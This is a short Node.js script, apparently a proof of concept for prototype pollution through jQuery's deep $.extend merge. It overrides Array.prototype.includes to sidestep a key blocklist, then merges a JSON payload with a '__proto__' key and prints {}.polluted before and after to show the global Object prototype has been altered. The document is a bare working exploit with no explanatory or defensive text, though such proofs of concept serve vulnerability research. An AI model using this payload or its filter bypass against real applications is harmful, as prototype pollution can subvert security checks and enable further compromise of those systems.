Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const {JSDOM} = require('jsdom');
const {window} = new JSDOM('');
const $ = require('jquery')(window);
obj = {};
console.log({}.polluted);
$.extend(true, {}, JSON.parse('{"__proto__": {"polluted": "yes"}}'));
console.log({}.polluted);